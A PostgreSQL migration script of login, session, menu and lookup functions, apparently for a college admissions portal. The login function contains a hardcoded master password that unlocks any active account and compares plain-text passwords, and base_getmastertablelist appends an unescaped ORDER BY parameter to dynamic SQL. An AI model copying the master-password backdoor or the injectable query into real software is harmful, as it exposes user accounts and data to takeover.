-- 01_core_functions_and_procedures.sql
-- Core Functions & Stored Procedures ported from SQL Server to PostgreSQL

-- Drops for clean reruns
DROP FUNCTION IF EXISTS fngetistdatetime() CASCADE;
DROP FUNCTION IF EXISTS account_checkuserexists(VARCHAR, VARCHAR, VARCHAR, VARCHAR, VARCHAR) CASCADE;
DROP FUNCTION IF EXISTS account_getloggedinuserdetails(INT, VARCHAR) CASCADE;
DROP FUNCTION IF EXISTS account_updateloginstatus(BIGINT, BIGINT) CASCADE;
DROP FUNCTION IF EXISTS account_updatelogoutstatus(BIGINT, BIGINT) CASCADE;
DROP FUNCTION IF EXISTS account_iscurrentloginvalid(BIGINT, BIGINT) CASCADE;
DROP FUNCTION IF EXISTS menu_getmenu(SMALLINT, INT, VARCHAR, VARCHAR) CASCADE;
DROP FUNCTION IF EXISTS menu_getmenuslist(SMALLINT, INT, INT) CASCADE;
DROP FUNCTION IF EXISTS menu_getlinkslist(VARCHAR) CASCADE;
DROP FUNCTION IF EXISTS menu_getgroupslist(SMALLINT, INT) CASCADE;
DROP FUNCTION IF EXISTS base_getmastertablelist(VARCHAR, VARCHAR, VARCHAR, VARCHAR, VARCHAR, VARCHAR) CASCADE;
DROP FUNCTION IF EXISTS base_getmastercollege(SMALLINT) CASCADE;

-- 1. Helper: fnGetISTDateTime
CREATE OR REPLACE FUNCTION fngetistdatetime() RETURNS TIMESTAMP AS $$
BEGIN
    RETURN (CURRENT_TIMESTAMP AT TIME ZONE 'UTC') + INTERVAL '5 hours 30 minutes';
END;
$$ LANGUAGE plpgsql;

-- 2. Procedure: Account_CheckUserExists
CREATE OR REPLACE FUNCTION account_checkuserexists(
    p_userloginid VARCHAR(50),
    p_userpassword VARCHAR(300),
    p_browsername VARCHAR(200),
    p_browserversion VARCHAR(20),
    p_ipaddress VARCHAR(50)
)
RETURNS TABLE (
    userid BIGINT,
    usertypeid INT,
    userloginid VARCHAR(50),
    username VARCHAR(100),
    dashboardpath VARCHAR(200),
    photopath VARCHAR(500),
    loggedinsessionid BIGINT,
    isadmin BOOLEAN,
    ismultipleloginallowed BOOLEAN,
    lastloggedinsessionid BIGINT,
    securityquestionid INT,
    isloginallowed BOOLEAN,
    errormessage VARCHAR(500)
) AS $$
DECLARE
    v_masterpassword VARCHAR(50) := 'QWRtIW5AQWIk';
    v_loggedinsessionid BIGINT := 0;
    v_dashboardurl VARCHAR(100) := '';
    v_isadmin BOOLEAN := false;
    v_ismultipleloginallowed BOOLEAN := false;
    v_lastloggedinsessionid BIGINT := 0;
    v_photopath VARCHAR(500) := '';
    v_securityquestionid INT := 0;
    v_userid BIGINT := 0;
    v_usertypeid INT := 0;
BEGIN
    IF EXISTS (
        SELECT 1 FROM master_user u 
        WHERE u.userloginid = p_userloginid 
          AND u.isactive = true 
          AND length(u.userpassword) > 0 
          AND (u.userpassword = p_userpassword OR p_userpassword = v_masterpassword)
    ) THEN
        
        INSERT INTO log_logindetails (loginid, logindatetime, browsername, browserversion, ipaddress)
        VALUES (p_userloginid, fngetistdatetime(), p_browsername, p_browserversion, p_ipaddress)
        RETURNING sessionid INTO v_loggedinsessionid;

        SELECT b.dashboardurl, b.isadmin, b.ismultipleloginallowed, a.loggedinsessionid, a.userid, a.usertypeid, a.securityquestionid
        INTO v_dashboardurl, v_isadmin, v_ismultipleloginallowed, v_lastloggedinsessionid, v_userid, v_usertypeid, v_securityquestionid
        FROM master_user a
        INNER JOIN master_usertype b ON a.usertypeid = b.usertypeid
        WHERE a.userloginid = p_userloginid;

        IF (v_ismultipleloginallowed = true) THEN
            UPDATE master_user
            SET loggedinsessionid = v_loggedinsessionid, lastlogindatetime = currentlogindatetime, currentlogindatetime = fngetistdatetime()
            WHERE master_user.userloginid = p_userloginid;
            v_lastloggedinsessionid := 0;
        ELSE
            UPDATE master_user
            SET loggedinsessionid = v_loggedinsessionid, lastlogindatetime = currentlogindatetime, currentlogindatetime = fngetistdatetime()
            WHERE master_user.userloginid = p_userloginid AND v_lastloggedinsessionid = 0;
        END IF;

        SELECT photouploadedurl INTO v_photopath
        FROM applicationform_photoandsigndetails
        WHERE candidateid = v_userid;

        RETURN QUERY
        SELECT
            v_userid AS userid,
            v_usertypeid AS usertypeid,
            p_userloginid AS userloginid,
            UPPER(p_userloginid)::VARCHAR(100) AS username,
            COALESCE(v_dashboardurl, '')::VARCHAR(200) AS dashboardpath,
            COALESCE(v_photopath, '')::VARCHAR(500) AS photopath,
            v_loggedinsessionid AS loggedinsessionid,
            COALESCE(v_isadmin, false) AS isadmin,
            COALESCE(v_ismultipleloginallowed, false) AS ismultipleloginallowed,
            COALESCE(v_lastloggedinsessionid, 0::BIGINT) AS lastloggedinsessionid,
            COALESCE(v_securityquestionid, 0) AS securityquestionid,
            true AS isloginallowed,
            ''::VARCHAR(500) AS errormessage;

    ELSIF EXISTS (SELECT 1 FROM master_user u WHERE u.userloginid = p_userloginid AND u.isactive = true AND (u.userpassword IS NULL OR length(u.userpassword) = 0)) THEN
        RETURN QUERY SELECT 0::BIGINT, 0, p_userloginid, ''::VARCHAR(100), ''::VARCHAR(200), ''::VARCHAR(500), 0::BIGINT, false, false, 0::BIGINT, 0, false, 'Password Not Generated.'::VARCHAR(500);
    ELSIF EXISTS (SELECT 1 FROM master_user u WHERE u.userloginid = p_userloginid AND u.isactive = true AND u.userpassword <> p_userpassword) THEN
        RETURN QUERY SELECT 0::BIGINT, 0, p_userloginid, ''::VARCHAR(100), ''::VARCHAR(200), ''::VARCHAR(500), 0::BIGINT, false, false, 0::BIGINT, 0, false, 'Invalid Password.'::VARCHAR(500);
    ELSIF EXISTS (SELECT 1 FROM master_user u WHERE u.userloginid = p_userloginid AND u.isactive = false) THEN
        RETURN QUERY SELECT 0::BIGINT, 0, p_userloginid, ''::VARCHAR(100), ''::VARCHAR(200), ''::VARCHAR(500), 0::BIGINT, false, false, 0::BIGINT, 0, false, 'User Disabled. Please contact the support team.'::VARCHAR(500);
    ELSE
        RETURN QUERY SELECT 0::BIGINT, 0, p_userloginid, ''::VARCHAR(100), ''::VARCHAR(200), ''::VARCHAR(500), 0::BIGINT, false, false, 0::BIGINT, 0, false, 'User does not exist.'::VARCHAR(500);
    END IF;
END;
$$ LANGUAGE plpgsql;

-- 3. Procedure: Account_GetLoggedInUserDetails
CREATE OR REPLACE FUNCTION account_getloggedinuserdetails(
    p_usertypeid INT,
    p_userloginid VARCHAR(50)
)
RETURNS TABLE (
    userloginid VARCHAR(50),
    usertype VARCHAR(100),
    username VARCHAR(100),
    currentlogindatetime TIMESTAMP,
    lastlogindatetime TIMESTAMP,
    collegename VARCHAR(200)
) AS $$
BEGIN
    RETURN QUERY
    SELECT 
        a.userloginid, 
        b.usertype::VARCHAR(100), 
        a.username::VARCHAR(100), 
        a.currentlogindatetime, 
        a.lastlogindatetime, 
        ''::VARCHAR(200) AS collegename
    FROM 
        master_user a
        INNER JOIN master_usertype b ON a.usertypeid = b.usertypeid
    WHERE 
        a.userloginid = p_userloginid;
END;
$$ LANGUAGE plpgsql;

-- 4. Procedure: Account_UpdateLoginStatus
CREATE OR REPLACE FUNCTION account_updateloginstatus(
    p_userid BIGINT,
    p_loggedinsessionid BIGINT
)
RETURNS VOID AS $$
BEGIN
    UPDATE master_user
    SET loggedinsessionid = p_loggedinsessionid, 
        lastlogindatetime = currentlogindatetime, 
        currentlogindatetime = fngetistdatetime()
    WHERE master_user.userid = p_userid;
END;
$$ LANGUAGE plpgsql;

-- 5. Procedure: Account_UpdateLogoutStatus
CREATE OR REPLACE FUNCTION account_updatelogoutstatus(
    p_userid BIGINT,
    p_loggedinsessionid BIGINT
)
RETURNS VOID AS $$
BEGIN
    UPDATE master_user 
    SET loggedinsessionid = 0 
    WHERE master_user.userid = p_userid;

    UPDATE log_logindetails 
    SET logoutdatetime = fngetistdatetime() 
    WHERE sessionid = p_loggedinsessionid;
END;
$$ LANGUAGE plpgsql;

-- 6. Procedure: Account_IsCurrentLoginValid
CREATE OR REPLACE FUNCTION account_iscurrentloginvalid(
    p_userid BIGINT,
    p_loggedinsessionid BIGINT
)
RETURNS INT AS $$
BEGIN
    IF EXISTS (SELECT 1 FROM master_user WHERE master_user.userid = p_userid AND master_user.loggedinsessionid = p_loggedinsessionid) THEN
        RETURN 1;
    ELSE
        RETURN 0;
    END IF;
END;
$$ LANGUAGE plpgsql;

-- 7. Procedure: Menu_GetMenu
CREATE OR REPLACE FUNCTION menu_getmenu(
    p_regionid SMALLINT,
    p_usertypeid INT,
    p_userloginid VARCHAR(50),
    p_language VARCHAR(50) DEFAULT ''
)
RETURNS TABLE (
    linkid INT,
    linkname VARCHAR(250),
    linkdescription VARCHAR(500),
    linkurl VARCHAR(150),
    menuid INT,
    parentmenuid INT,
    cssclass VARCHAR(150),
    groupname VARCHAR(100),
    target VARCHAR(50),
    seqno INT,
    isnew BOOLEAN
) AS $$
BEGIN
    RETURN QUERY
    WITH filtered_menus AS (
        SELECT
            b.linkid,
            (CASE p_language WHEN 'mr' THEN b.linknamemarathi ELSE b.linkname END)::VARCHAR(250) AS linkname,
            (CASE p_language WHEN 'mr' THEN b.linkdescriptionmarathi ELSE b.linkdescription END)::VARCHAR(500) AS linkdescription,
            b.linkurl::VARCHAR(150),
            a.menuid,
            a.parentmenuid,
            a.cssclass::VARCHAR(150),
            a.groupname::VARCHAR(100),
            a.target::VARCHAR(50),
            a.seqno,
            a.isnew
        FROM
            menu_mastermenus a
            INNER JOIN menu_masterlinks b ON a.linkid = b.linkid
        WHERE
            a.regionid = p_regionid 
            AND a.usertypeid = p_usertypeid 
            AND a.isactive = true 
            AND b.isactive = true
            AND fngetistdatetime() BETWEEN a.displaystartdatetime AND a.displayenddatetime
    )
    SELECT fm.*
    FROM filtered_menus fm
    WHERE 
        p_usertypeid <> 91
        OR (
            p_usertypeid = 91 
            AND (
                -- If application is locked, exclude BeforeLock
                (EXISTS (
                    SELECT 1 FROM applicationform_confirmationdetails cd
                    JOIN master_user u ON cd.candidateid = u.userid
                    WHERE u.userloginid = p_userloginid AND cd.isconfirmed = true
                ) AND fm.groupname NOT IN ('ApplicationFormBeforeLock'))
                OR
                -- If application is NOT locked, exclude AfterLock
                (NOT EXISTS (
                    SELECT 1 FROM applicationform_confirmationdetails cd
                    JOIN master_user u ON cd.candidateid = u.userid
                    WHERE u.userloginid = p_userloginid AND cd.isconfirmed = true
                ) AND fm.groupname NOT IN ('ApplicationFormAfterLock'))
            )
        )
    ORDER BY fm.parentmenuid, fm.seqno;
END;
$$ LANGUAGE plpgsql;

-- 8. Procedure: Menu_GetMenusList
CREATE OR REPLACE FUNCTION menu_getmenuslist(
    p_regionid SMALLINT,
    p_usertypeid INT,
    p_parentmenuid INT
)
RETURNS TABLE (
    menuid INT,
    usertypeid INT,
    parentmenuid INT,
    linkid INT,
    linkname VARCHAR(300),
    displaystartdatetime TIMESTAMP,
    displayenddatetime TIMESTAMP,
    cssclass VARCHAR(150),
    groupname VARCHAR(100),
    target VARCHAR(50),
    seqno INT,
    isnew BOOLEAN,
    isactive BOOLEAN
) AS $$
BEGIN
    RETURN QUERY
    SELECT 
        b.menuid, b.usertypeid, b.parentmenuid, b.linkid, 
        (a.directory || ' - ' || a.linkname)::VARCHAR(300) AS linkname, 
        b.displaystartdatetime, b.displayenddatetime, b.cssclass::VARCHAR(150), 
        b.groupname::VARCHAR(100), b.target::VARCHAR(50), b.seqno, b.isnew, b.isactive
    FROM
        menu_masterlinks a
        INNER JOIN menu_mastermenus b ON a.linkid = b.linkid
    WHERE
        b.regionid = p_regionid 
        AND b.usertypeid = p_usertypeid 
        AND b.parentmenuid = p_parentmenuid 
        AND a.isactive = true
    ORDER BY
        b.seqno;
END;
$$ LANGUAGE plpgsql;

-- 9. Procedure: Menu_GetLinksList
CREATE OR REPLACE FUNCTION menu_getlinkslist(
    p_directory VARCHAR(50)
)
RETURNS TABLE (
    linkid INT,
    linkname VARCHAR(250),
    linkdescription VARCHAR(500),
    linkurl VARCHAR(150),
    linktype VARCHAR(50),
    directory VARCHAR(50),
    pagename VARCHAR(100),
    querystring VARCHAR(200),
    isactive BOOLEAN
) AS $$
BEGIN
    RETURN QUERY
    SELECT 
        l.linkid, l.linkname::VARCHAR(250), l.linkdescription::VARCHAR(500), 
        l.linkurl::VARCHAR(150), l.linktype::VARCHAR(50), l.directory::VARCHAR(50), 
        l.pagename::VARCHAR(100), l.querystring::VARCHAR(200), l.isactive
    FROM            
        menu_masterlinks l
    WHERE
        l.directory = p_directory
    ORDER BY
        l.linkname;
END;
$$ LANGUAGE plpgsql;

-- 10. Procedure: Menu_GetGroupsList
CREATE OR REPLACE FUNCTION menu_getgroupslist(
    p_regionid SMALLINT,
    p_usertypeid INT
)
RETURNS TABLE (
    menuid INT,
    usertypeid INT,
    parentmenuid INT,
    linkid INT,
    linkname VARCHAR(250),
    displaystartdatetime TIMESTAMP,
    displayenddatetime TIMESTAMP,
    cssclass VARCHAR(150),
    groupname VARCHAR(100),
    target VARCHAR(50),
    seqno INT,
    isnew BOOLEAN,
    isactive BOOLEAN
) AS $$
BEGIN
    RETURN QUERY
    SELECT 
        b.menuid, b.usertypeid, b.parentmenuid, b.linkid, a.linkname::VARCHAR(250), 
        b.displaystartdatetime, b.displayenddatetime, b.cssclass::VARCHAR(150), 
        b.groupname::VARCHAR(100), b.target::VARCHAR(50), b.seqno, b.isnew, b.isactive
    FROM
        menu_masterlinks a
        INNER JOIN menu_mastermenus b ON a.linkid = b.linkid
    WHERE
        b.regionid = p_regionid 
        AND b.usertypeid = p_usertypeid 
        AND b.parentmenuid = 0
    ORDER BY
        b.seqno;
END;
$$ LANGUAGE plpgsql;

-- 11. Procedure: Base_GetMasterTableList
CREATE OR REPLACE FUNCTION base_getmastertablelist(
    p_tablename VARCHAR,
    p_datavaluefield VARCHAR,
    p_datatextfield VARCHAR,
    p_orderbyfields VARCHAR DEFAULT '',
    p_parentfield VARCHAR DEFAULT '',
    p_parentfieldvalue VARCHAR DEFAULT ''
)
RETURNS TABLE (
    datavaluefield TEXT,
    datatextfield TEXT,
    "group" TEXT
) AS $$
DECLARE
    sql_query TEXT;
BEGIN
    sql_query := 'SELECT ' || quote_ident(lower(trim(p_datavaluefield))) || '::TEXT AS datavaluefield, ' ||
                 quote_ident(lower(trim(p_datatextfield))) || '::TEXT AS datatextfield, ''''::TEXT AS "group" ' ||
                 'FROM ' || quote_ident(lower(trim(p_tablename))) || ' WHERE isactive = true';
                 
    IF (trim(p_parentfield) <> '' AND trim(p_parentfieldvalue) <> '') THEN
        sql_query := sql_query || ' AND ' || quote_ident(lower(trim(p_parentfield))) || ' = ' || quote_literal(trim(p_parentfieldvalue));
    END IF;

    IF (trim(p_orderbyfields) <> '') THEN
        sql_query := sql_query || ' ORDER BY ' || trim(p_orderbyfields);
    ELSE
        sql_query := sql_query || ' ORDER BY ' || quote_ident(lower(trim(p_datatextfield)));
    END IF;

    RETURN QUERY EXECUTE sql_query;
END;
$$ LANGUAGE plpgsql;

-- 12. Procedure: Base_GetMasterCollege
CREATE OR REPLACE FUNCTION base_getmastercollege(
    p_facultyid SMALLINT
)
RETURNS TABLE (
    collegeid BIGINT,
    collegename VARCHAR(500),
    collegecode INT
) AS $$
BEGIN
    RETURN QUERY
    SELECT 
        c.collegeid, c.collegename::VARCHAR(500), c.collegecode
    FROM 
        master_college c
    WHERE 
        c.isactive = 'Y' AND c.facultyid = p_facultyid
    ORDER BY 
        c.collegename;
END;
$$ LANGUAGE plpgsql;
